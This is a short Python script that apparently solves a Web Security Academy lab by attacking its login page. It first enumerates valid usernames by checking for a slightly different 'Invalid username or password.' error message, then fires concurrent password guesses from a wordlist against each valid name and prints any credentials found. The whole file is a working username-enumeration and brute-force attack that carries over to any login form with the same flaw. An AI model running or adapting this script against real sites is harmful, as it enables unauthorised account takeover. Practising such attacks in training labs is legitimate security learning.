import aiohttp
import asyncio

url = 'https://ac091fe51e65fe97c0524afc00d0006f.web-security-academy.net/login'
cookies = {'session': 'LzoPILwKmbqZwvWeWJ9C3fiRkXrdCDcR'}

async def test_username(session, name):
    data = {'username': name, 'password': 'a'}
    async with session.post(url=url, data=data) as resp:
        text = await resp.text()
        return (name, 'Invalid username or password.' in text)

async def test_password(session, name, password):
    data = {'username': name, 'password': password}
    async with session.post(url=url, data=data) as resp:
        text = await resp.text()
        return (name, password, 'Invalid' in text)

async def main():
    async with aiohttp.ClientSession(cookies=cookies) as session:
        tasks = []

        with open('usernames.txt', 'r') as f:
            for name in f.readlines():
                tasks.append(asyncio.ensure_future(test_username(session, name.strip())))

        res = await asyncio.gather(*tasks)
        valid_names = []
        for name, resp in res:
            if not resp:
                print(f"Found {name}")
                valid_names.append(name)

        tasks = []
        for name in valid_names:
            with open('passwords.txt', 'r') as f:
                for password in f.readlines():
                    tasks.append(asyncio.ensure_future(test_password(session, name, password.strip()))) 

        res = await asyncio.gather(*tasks)
        for name, password, invalid in res:
            if not invalid:
                print(f"Found credentials {name}:{password}")

asyncio.run(main())
